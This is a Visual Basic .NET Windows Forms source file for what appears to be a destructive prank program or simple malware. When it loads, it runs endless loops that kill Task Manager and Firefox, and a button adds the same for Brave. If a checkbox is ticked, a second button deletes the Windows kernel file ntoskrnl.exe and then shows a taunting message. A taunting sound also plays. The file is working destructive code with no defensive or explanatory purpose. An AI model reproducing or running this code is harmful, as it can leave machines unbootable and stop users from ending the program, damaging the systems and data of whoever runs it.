Imports System
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim T As New Threading.Thread(AddressOf Block)
        T.Start()
        Dim J As New Threading.Thread(AddressOf FuckingAnotherBrowser)
        J.Start()
        BackgroundWorker1.RunWorkerAsync()
    End Sub
    Sub Block()
        While True
            For Each P As Process In Process.GetProcessesByName("taskmgr")
                P.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Sub FuckingAnotherBrowser()
        While True
            For Each K As Process In Process.GetProcessesByName("firefox")
                K.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Sub FuckingAnotherShit()
        While True
            For Each Z As Process In Process.GetProcessesByName("brave")
                Z.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim sysFile As String
        Dim sysFile9x As String
        sysFile = "C:\Windows\System32\ntoskrnl.exe"
        sysFile9x = "C:\Windows\win.com"

        Form2.Show()
        If CheckBox1.Checked = True Then
            System.IO.File.Delete(sysFile)
            MsgBox("You're mega fuck'd :))))")
        End If
    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        My.Computer.Audio.Play("yourefucked.wav")
        MessageBox.Show("*Boss music plays*")
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        MessageBox.Show("Made In Visual Basic :)")
        Dim N As New Threading.Thread(AddressOf FuckingAnotherShit)
        N.Start()
    End Sub
End Class
